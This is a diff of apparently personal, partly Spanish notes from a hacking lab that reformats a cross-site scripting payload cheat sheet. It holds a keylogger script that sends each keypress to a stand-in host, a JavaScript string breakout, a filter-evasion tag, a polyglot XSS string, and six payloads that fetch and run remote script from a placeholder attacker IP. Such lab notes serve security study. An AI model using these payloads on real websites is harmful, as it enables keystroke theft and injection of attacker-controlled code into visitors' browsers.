@@ -20,27 +20,33 @@ D
 
 
 
-keylogger
-<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+#### keylogger
+        <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
 
 
-quebrar un código JS que recibe el imput
-';alert('THM');//
+#### Quebrar un código JS que recibe el imput
+        ';alert('THM');//
 
-No HTML inject and script clean:
-<sSCRIPTcript> </sSCRIPTcript>
+#### No HTML inject and script clean:
+        <sSCRIPTcript> </sSCRIPTcript>
 
-Polyglots:
+#### Polyglots:
 
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('porota') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('porota')//>\x3e
+        jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('porota') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('porota')//>\x3e
 
-probar si se conecta a otro servidor:
-<script src=http://OUR_IP></script>
-'><script src=http://OUR_IP></script>
-"><script src=http://OUR_IP></script>
-javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
-<script>$.getScript("http://OUR_IP")</script>
+#### Probar si se conecta a otro servidor:
+A
+        <script src=http://OUR_IP></script>
+B
+        '><script src=http://OUR_IP></script>
+C
+        "><script src=http://OUR_IP></script>
+D
+        javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+E
+        <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+F
+        <script>$.getScript("http://OUR_IP")</script>
 
 
 fake form
